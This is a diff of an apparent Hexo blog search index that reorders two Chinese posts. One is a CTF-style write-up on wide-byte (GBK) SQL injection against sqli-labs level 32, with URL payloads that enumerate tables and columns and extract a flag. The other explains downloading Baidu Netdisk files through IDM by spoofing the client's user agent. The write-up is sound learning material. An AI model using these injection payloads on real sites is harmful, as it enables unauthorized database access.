@@ -369,66 +369,6 @@
       </categories>
   </entry>
   <entry>
-    <title>使用idm下载百度网盘文件</title>
-    <url>/2021/05/25/idm/</url>
-    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
-
-
-
-<p>准备工作：idm、<a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkey插件</a></p>
-<h1 id="一、配置IDM"><a href="#一、配置IDM" class="headerlink" title="一、配置IDM"></a>一、配置IDM</h1><p>打开客户端 点击右上角下载，在弹出的选项中找到最下边的<code>选项</code>转到配置界面</p>
-<p><img src="https://img.vim-cn.com/c5/fa6d5e4901cf31dd9313aeb236c7e832b7d049.png"></p>
-<p>点击下载，修改用户代理为👇</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdisk;P2SP;2.2.60.26</span><br></pre></td></tr></table></figure>
-
-<p>点击<code>确定</code>保存</p>
-<p>点击连接</p>
-<p><img src="https://img.vim-cn.com/89/8a4b17ee04e32945c5c0b5a199d039d111e6a6.png"></p>
-<p>点新建，在弹出的窗口中输入<code>*.baidupcs.com</code>，前缀切换为<code>https://</code>修改最大连接数为2</p>
-<p>点击<code>确定</code>保存</p>
-<h1 id="二、安装油猴脚本"><a href="#二、安装油猴脚本" class="headerlink" title="二、安装油猴脚本"></a>二、安装油猴脚本</h1><p><a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkey插件</a></p>
-<h1 id="三、下载"><a href="#三、下载" class="headerlink" title="三、下载"></a>三、下载</h1><p><img src="https://img.vim-cn.com/90/8e9acd0ccc1faaefb29786432d994430a4baa9.png"></p>
-<p>发现多了一个按钮，点击选择api下载即可自动弹出idm窗口（记得先打开idm</p>
-]]></content>
-      <categories>
-        <category>工具使用</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>宽字节注入</title>
-    <url>/2021/05/18/kuan/</url>
-    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
-
-
-<h1 id="一、什么是宽字节注入？"><a href="#一、什么是宽字节注入？" class="headerlink" title="一、什么是宽字节注入？"></a>一、什么是宽字节注入？</h1><p><img src="https://img-blog.csdnimg.cn/20210113171352374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210113171400407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210113171412165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="二、练习"><a href="#二、练习" class="headerlink" title="二、练习"></a>二、练习</h1><h2 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h2><p><a href="http://chinalover.sinaapp.com/SQL-GBK/">http://chinalover.sinaapp.com/SQL-GBK/</a></p>
-<p>sqli-labs 第32关(没有搭建的话可以去<a href="https://buuoj.cn/challenges#sqli-labs">buuctf找basic中的sqli-labs</a>)[这个可以配合理解，自行操作效果极佳]</p>
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="https://img-blog.csdnimg.cn/20210113172133600.png" alt="在这里插入图片描述"><br>随便输个id<br><img src="https://img-blog.csdnimg.cn/20210113172209227.png" alt="在这里插入图片描述"><br>尝试用单引号闭合<br><img src="https://img-blog.csdnimg.cn/20210113172237782.png" alt="在这里插入图片描述"><br>发现‘ ‘ ’(单引号)转变成了‘ \‘ ’(反斜杠+单引号)<br>那就结合今天所学知识进行操作<br>首先利用order by 语句进行查询</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 1%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172707300.png" alt="![在这里插入图片描述](https://img-blog.csdnimg.cn/20210113172529680.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 2%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172651674.png" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 3%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172637974.png" alt="在这里插入图片描述"><br>3的话出现报错说明只有2个字段</p>
-<p>接着利用union select语句查询数据库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,database()%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172929536.png" alt="在这里插入图片描述"><br>有了数据库名之后接着往下查</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
-
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113173125851.png" alt="在这里插入图片描述"><br>接着查ctf4（其余几个有兴趣也可以查一下看看，给出ctf4是因为里边有flag）</p>
-<p>这里给ctf4转为了16进制（记得在前边加上0x）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x63746634%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113173544299.png" alt="在这里插入图片描述"><br>看到了flag<br>继续查</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(flag)%20from ctf4%23</span><br></pre></td></tr></table></figure>
-<p>也可以这样查</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union select 1,(select flag from ctf4)%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113174012340.png" alt="在这里插入图片描述"><br>这样就找到flag了</p>
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-  </entry>
-  <entry>
     <title>从0开始学web(一) http篇</title>
     <url>/2021/04/29/http/</url>
     <content><![CDATA[<p><font color=#999AAA >最近打算重新开始从头学web，简单记录一下</font></p>
@@ -468,6 +408,40 @@
 <hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
 
 <h1 id="http响应码"><a href="#http响应码" class="headerlink" title="http响应码"></a>http响应码</h1><p>详细内容【<a href="https://www.runoob.com/http/http-status-codes.html">传送门</a>】</p>
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>宽字节注入</title>
+    <url>/2021/05/18/kuan/</url>
+    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
+
+
+<h1 id="一、什么是宽字节注入？"><a href="#一、什么是宽字节注入？" class="headerlink" title="一、什么是宽字节注入？"></a>一、什么是宽字节注入？</h1><p><img src="https://img-blog.csdnimg.cn/20210113171352374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210113171400407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210113171412165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="二、练习"><a href="#二、练习" class="headerlink" title="二、练习"></a>二、练习</h1><h2 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h2><p><a href="http://chinalover.sinaapp.com/SQL-GBK/">http://chinalover.sinaapp.com/SQL-GBK/</a></p>
+<p>sqli-labs 第32关(没有搭建的话可以去<a href="https://buuoj.cn/challenges#sqli-labs">buuctf找basic中的sqli-labs</a>)[这个可以配合理解，自行操作效果极佳]</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="https://img-blog.csdnimg.cn/20210113172133600.png" alt="在这里插入图片描述"><br>随便输个id<br><img src="https://img-blog.csdnimg.cn/20210113172209227.png" alt="在这里插入图片描述"><br>尝试用单引号闭合<br><img src="https://img-blog.csdnimg.cn/20210113172237782.png" alt="在这里插入图片描述"><br>发现‘ ‘ ’(单引号)转变成了‘ \‘ ’(反斜杠+单引号)<br>那就结合今天所学知识进行操作<br>首先利用order by 语句进行查询</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 1%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172707300.png" alt="![在这里插入图片描述](https://img-blog.csdnimg.cn/20210113172529680.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 2%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172651674.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 3%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172637974.png" alt="在这里插入图片描述"><br>3的话出现报错说明只有2个字段</p>
+<p>接着利用union select语句查询数据库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,database()%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172929536.png" alt="在这里插入图片描述"><br>有了数据库名之后接着往下查</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113173125851.png" alt="在这里插入图片描述"><br>接着查ctf4（其余几个有兴趣也可以查一下看看，给出ctf4是因为里边有flag）</p>
+<p>这里给ctf4转为了16进制（记得在前边加上0x）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x63746634%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113173544299.png" alt="在这里插入图片描述"><br>看到了flag<br>继续查</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(flag)%20from ctf4%23</span><br></pre></td></tr></table></figure>
+<p>也可以这样查</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union select 1,(select flag from ctf4)%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113174012340.png" alt="在这里插入图片描述"><br>这样就找到flag了</p>
 ]]></content>
       <categories>
         <category>web学习</category>
@@ -679,6 +653,32 @@
 ]]></content>
       <categories>
         <category>比赛复现</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>使用idm下载百度网盘文件</title>
+    <url>/2021/05/25/idm/</url>
+    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
+
+
+
+<p>准备工作：idm、<a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkey插件</a></p>
+<h1 id="一、配置IDM"><a href="#一、配置IDM" class="headerlink" title="一、配置IDM"></a>一、配置IDM</h1><p>打开客户端 点击右上角下载，在弹出的选项中找到最下边的<code>选项</code>转到配置界面</p>
+<p><img src="https://img.vim-cn.com/c5/fa6d5e4901cf31dd9313aeb236c7e832b7d049.png"></p>
+<p>点击下载，修改用户代理为👇</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdisk;P2SP;2.2.60.26</span><br></pre></td></tr></table></figure>
+
+<p>点击<code>确定</code>保存</p>
+<p>点击连接</p>
+<p><img src="https://img.vim-cn.com/89/8a4b17ee04e32945c5c0b5a199d039d111e6a6.png"></p>
+<p>点新建，在弹出的窗口中输入<code>*.baidupcs.com</code>，前缀切换为<code>https://</code>修改最大连接数为2</p>
+<p>点击<code>确定</code>保存</p>
+<h1 id="二、安装油猴脚本"><a href="#二、安装油猴脚本" class="headerlink" title="二、安装油猴脚本"></a>二、安装油猴脚本</h1><p><a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkey插件</a></p>
+<h1 id="三、下载"><a href="#三、下载" class="headerlink" title="三、下载"></a>三、下载</h1><p><img src="https://img.vim-cn.com/90/8e9acd0ccc1faaefb29786432d994430a4baa9.png"></p>
+<p>发现多了一个按钮，点击选择api下载即可自动弹出idm窗口（记得先打开idm</p>
+]]></content>
+      <categories>
+        <category>工具使用</category>
       </categories>
   </entry>
   <entry>
